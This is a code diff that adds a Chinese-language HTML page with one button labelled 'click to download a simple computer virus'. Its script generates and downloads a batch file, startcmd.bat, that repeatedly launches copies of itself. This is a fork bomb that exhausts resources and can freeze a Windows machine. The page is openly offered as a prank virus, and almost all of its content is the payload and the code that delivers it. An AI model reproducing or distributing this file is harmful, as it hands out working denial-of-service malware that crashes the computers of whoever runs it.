@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>下载文件</title>
+  <style>
+   body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    
+    .button-container {
+      text-align: center;
+    }
+    
+    button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      text-align: center;
+      text-decoration: none;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="button-conainer">
+    <button onclick="saveFile()">点击下载简易电脑病毒</button>
+  </div>
+  
+  <script>
+    function saveFile() {
+      var content = "start startcmd.bat"; // 获取文件内容，你可以根据需要自行修改
+      var filename = "startcmd.bat"; // 设置文件名，你可以根据需要自行修改
+
+      var element = document.createElement('a');
+      element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
+      element.setAttribute('download', filename);
+
+      element.style.display = 'none';
+      document.body.appendChild(element);
+
+      element.click();
+
+      document.body.removeChild(element);
+    }
+  </script>
+</body>
+</html>
